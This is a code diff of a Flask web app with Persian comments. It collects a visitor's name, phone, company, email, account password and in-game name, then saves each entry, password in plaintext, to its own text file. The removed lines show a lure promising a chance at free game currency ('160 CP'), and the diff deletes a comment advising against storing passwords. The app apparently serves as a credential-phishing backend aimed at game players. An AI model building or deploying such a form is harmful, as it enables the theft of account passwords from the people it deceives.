@@ -7,13 +7,13 @@ import re
 
 app = Flask(__name__)
 
-DATA_DIR = Path(app.root_path) / "data"
+# مسیر ذخیره فایل‌ها (پوشه users)
+DATA_DIR = Path(app.root_path) / "users"
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 
-# لیست دامنه‌های ایمیل موقت (disposable)
+# لیست دامنه‌های ایمیل موقت
 DISPOSABLE_EMAIL_DOMAINS = [
     "mailinator.com", "tempmail.com", "guerrillamail.com", "10minutemail.com", "maildrop.cc"
-    # اضافه کردن دامنه‌های دیگر در صورت نیاز
 ]
 
 # تابع برای اعتبارسنجی شماره تلفن
@@ -23,16 +23,12 @@ def validate_phone(phone):
 
 # تابع برای اعتبارسنجی ایمیل
 def validate_email_address(email):
-    # بررسی فرمت ایمیل با استفاده از regex
     email_pattern = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
     if not re.match(email_pattern, email):
         return False, "فرمت ایمیل وارد شده صحیح نیست."
-
-    # بررسی دامنه ایمیل
     domain = email.split('@')[1]
     if domain in DISPOSABLE_EMAIL_DOMAINS:
         return False, "ایمیل وارد شده از نوع ایمیل موقت است. لطفاً ایمیل معتبر وارد کنید."
-    
     return True, ""
 
 @app.route('/')
@@ -45,7 +41,7 @@ def submit():
     phone = request.form.get('phone', '').strip()
     company = request.form.get('company', '').strip()
     email = request.form.get('email', '').strip()
-    password = request.form.get('password', '').strip()  # توصیه: رمزها را ذخیره نکن
+    password = request.form.get('password', '').strip()
     gamename = request.form.get('gamename', '').strip()
 
     # اعتبارسنجی نام و نام خانوادگی
@@ -61,7 +57,7 @@ def submit():
     if not is_valid_email:
         return render_template('index.html', message=email_message)
 
-    # ذخیره اطلاعات در فایل
+    # ذخیره اطلاعات در فایل تکست جداگانه
     timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
     safe_email = secure_filename(email.replace('@', '_at_')) or "unknown"
     filename = f"{safe_email}_{timestamp}.txt"
@@ -75,7 +71,7 @@ def submit():
         f.write(f"رمز عبور: {password}\n")
         f.write(f"نام در بازی: {gamename}\n")
 
-    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")
+    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید.")
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
